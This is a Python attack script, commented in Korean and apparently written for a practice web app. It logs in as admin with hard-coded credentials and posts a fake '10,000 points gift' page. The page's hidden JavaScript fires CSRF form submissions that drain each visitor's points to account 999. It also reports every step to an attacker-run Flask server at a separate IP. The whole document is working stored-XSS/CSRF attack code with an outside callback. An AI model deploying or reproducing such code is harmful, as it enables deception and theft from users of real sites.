#!/usr/bin/env python3
"""
fake-gift CSRF 공격 최종 버전
- 첫 실패 시 중단
- 실제 성공한 것만 카운트
"""

import requests

TARGET = "http://52.78.221.104"
LOGIN_URL = f"{TARGET}/login.php"
POST_URL = f"{TARGET}/new_post.php"
INDEX_URL = f"{TARGET}/index.php"

# 최종 개선 fake-gift HTML
FAKE_GIFT_HTML = """<div style="font-family:Arial;text-align:center;padding:50px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;margin:0"><div style="background:white;color:#333;padding:50px;border-radius:20px;max-width:500px;margin:0 auto;box-shadow:0 20px 60px rgba(0,0,0,0.3)"><div style="font-size:100px">🎁</div><h1 style="color:#667eea">🎉 축하합니다!</h1><p style="font-size:1.5em">10,000 포인트를 받으셨습니다!</p><div id="s" style="background:#f0f0f0;padding:15px;border-radius:10px;margin:20px 0;color:#667eea;font-weight:bold">처리 중...</div></div><div id="f"></div><script>const A='http://13.158.67.78:5000';let stolen=0,failed=false;function n(e,p){if(!failed){const i=new Image();i.src=A+e+'?'+p+'&t='+Date.now()}}n('/notify','event=page_loaded');const am=[50000,30000,20000,10000,5000,3000,2000,1000,500,300,200,100];let h='';am.forEach((a,i)=>{h+='<form id="f'+i+'" method="POST" action="http://52.78.221.104/profile.php" target="if'+i+'"><input type="hidden" name="send_gift" value="1"><input type="hidden" name="receiver_id" value="999"><input type="hidden" name="gift_type" value="diamond"><input type="hidden" name="points" value="'+a+'"><input type="hidden" name="message" value="Event"></form><iframe name="if'+i+'" id="iframe'+i+'" style="display:none" onload="checkResult('+i+','+a+')"></iframe>'});document.getElementById('f').innerHTML=h;const t=am.reduce((a,b)=>a+b,0);n('/victim','points='+t);let idx=0,submitted={};function checkResult(i,amt){if(!submitted[i])return;setTimeout(()=>{try{const iframe=document.getElementById('iframe'+i);let success=false;try{const doc=iframe.contentDocument||iframe.contentWindow.document;const body=doc.body;const text=body?body.innerText.toLowerCase():'';if(!text||text.includes('success')||text.includes('sent')||text.includes('transferred')||!text.includes('insufficient')&&!text.includes('error')&&!text.includes('fail')){success=true}}catch(e){success=true}if(success){stolen+=amt;n('/transfer','amount='+amt);console.log('[+] Success:',amt+'P (Total: '+stolen+'P)')}else{failed=true;console.log('[-] Failed:',amt+'P - 포인트 부족, 공격 중단');n('/complete','total='+stolen);setTimeout(()=>{document.getElementById('s').innerHTML='완료! ('+stolen+'P)';setTimeout(()=>{window.location.href='http://52.78.221.104/index.php'},2000)},500);return}if(i===am.length-1){n('/complete','total='+stolen);setTimeout(()=>{document.getElementById('s').innerHTML='✅ 완료!';setTimeout(()=>{window.location.href='http://52.78.221.104/index.php'},2000)},1000)}}catch(e){console.log('[!] Error:',e)}},800)}function sendNext(){if(idx>=am.length||failed){if(!failed&&stolen>0){n('/complete','total='+stolen);setTimeout(()=>{document.getElementById('s').innerHTML='✅ 완료!';setTimeout(()=>{window.location.href='http://52.78.221.104/index.php'},2000)},1000)}return}const i=idx;submitted[i]=true;document.getElementById('f'+i).submit();document.getElementById('s').innerHTML='처리 중... '+Math.round((i+1)/am.length*100)+'%';idx++;setTimeout(sendNext,300)}sendNext()</script></div>"""

print("="*60)
print("🎁 fake-gift 최종 버전 (정확한 카운팅)")
print("="*60)
print()

session = requests.Session()

print("[*] admin으로 로그인 중...")
r = session.post(LOGIN_URL, data={'username': 'admin', 'password': 'admin123'}, allow_redirects=True)

if 'index.php' in r.url or 'profile.php' in r.url:
    print("[+] 로그인 성공!")
else:
    print("[-] 로그인 실패")
    exit(1)

print("\n[*] 기존 fake-gift 게시물 확인...")
r = session.get(INDEX_URL)
if '🎁' in r.text:
    print("[!] 기존 게시물 존재 - 새 버전으로 업데이트")

print("\n[*] 최종 버전 fake-gift 페이지 게시 중...")
r = session.post(POST_URL, data={'content': FAKE_GIFT_HTML}, allow_redirects=True)

print(f"[+] 응답 코드: {r.status_code}")
print(f"[+] 응답 URL: {r.url}")

r = session.get(INDEX_URL)
if '🎁' in r.text:
    print("[+] fake-gift 페이지 게시 완료!")
    print()
    print("="*60)
    print("✅ 최종 버전 배포 완료!")
    print("="*60)
    print()
    print("주요 개선사항:")
    print("- iframe 응답을 실제로 확인")
    print("- 실패 감지 시 즉시 중단")
    print("- 성공한 것만 카운트")
    print("- 포인트 부족 시 공격 중지")
    print()
    print("테스트:")
    print("1. Flask 리셋: http://13.158.67.78:5000/reset")
    print("2. alice로 재로그인 (포인트 500으로 복구)")
    print("3. index.php 접속")
    print("4. Flask 대시보드 확인")
    print()
    print("alice 포인트가 0이 되면 자동으로 공격 중단!")
    print("Flask에는 실제 탈취한 포인트만 표시됩니다.")
    print()
    print("="*60)
else:
    print("[-] 게시물 확인 실패")
